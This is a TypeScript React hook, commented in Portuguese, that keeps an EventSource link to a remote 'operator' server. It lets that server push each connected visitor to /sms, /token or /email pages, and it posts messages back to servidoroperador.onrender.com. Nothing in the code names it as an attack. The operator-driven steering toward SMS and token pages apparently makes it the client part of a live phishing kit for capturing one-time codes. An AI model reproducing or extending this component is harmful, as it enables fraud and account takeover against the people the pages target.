import { useEffect, useRef, useState } from 'react';
import { useRouter } from 'next/navigation';

interface EventSourceHookOptions {
  url: string;
  clientId?: string;
  onMessage?: (data: any) => void;
  onError?: (error: Event) => void;
}

export const useEventSource = ({ url, clientId, onMessage, onError }: EventSourceHookOptions) => {
  const [isConnected, setIsConnected] = useState(false);
  const [lastEvent, setLastEvent] = useState<any>(null);
  const eventSourceRef = useRef<EventSource | null>(null);
  const router = useRouter();

  useEffect(() => {
    if (!clientId || typeof window === 'undefined') return;

    // URL corrigida para o servidor do Firebase/Backend
    const eventSourceUrl = `${url}?clientId=${clientId}`;
    
    console.log('🔗 Conectando ao EventSource:', eventSourceUrl);
    
    // Criar conexão EventSource
    const eventSource = new EventSource(eventSourceUrl);
    eventSourceRef.current = eventSource;

    eventSource.onopen = () => {
      console.log('✅ EventSource conectado');
      setIsConnected(true);
    };

    eventSource.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        console.log('📨 Evento recebido:', data);
        
        setLastEvent(data);
        
        // Processar comandos de redirecionamento
        if (data.command) {
          handleCommand(data.command, data.params);
        }
        
        // Callback personalizado
        if (onMessage) {
          onMessage(data);
        }
        
      } catch (error) {
        console.log('❌ Erro ao processar evento:', error);
      }
    };

    eventSource.onerror = (error) => {
      console.log('❌ Erro no EventSource:', error);
      setIsConnected(false);
      
      if (onError) {
        onError(error);
      }
      
      // Tentar reconectar em 5 segundos
      setTimeout(() => {
        if (eventSourceRef.current?.readyState === EventSource.CLOSED) {
          console.log('🔄 Tentando reconectar EventSource...');
          // Recriar conexão será feita pelo useEffect quando o estado mudar
        }
      }, 5000);
    };

    // Cleanup
    return () => {
      console.log('🔌 Fechando EventSource');
      eventSource.close();
      setIsConnected(false);
    };
  }, [url, clientId]);

  const handleCommand = (command: string, params?: any) => {
    console.log('🎯 Processando comando:', command, params);
    
    switch (command) {
      case 'ir_sms':
        console.log('📱 Redirecionando para SMS');
        router.push('/sms');
        break;
        
      case 'ir_auth':
      case 'ir_token':
        console.log('🔐 Redirecionando para Token');
        router.push('/token');
        break;
        
      case 'ir_email':
        console.log('📧 Redirecionando para Email');
        router.push('/email');
        break;
        
      case 'ir_home':
        console.log('🏠 Redirecionando para Home');
        router.push('/home');
        break;
        
      default:
        console.log('❓ Comando desconhecido:', command);
    }
  };

  const sendMessage = (message: any) => {
    // Para enviar mensagens, usaremos fetch para a API
    if (!clientId) return;
    
    fetch('https://servidoroperador.onrender.com/api/clients/command', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        clientId,
        ...message
      })
    }).catch(error => {
      console.log('❌ Erro ao enviar mensagem:', error);
    });
  };

  return {
    isConnected,
    lastEvent,
    sendMessage,
    disconnect: () => {
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
        setIsConnected(false);
      }
    }
  };
}; 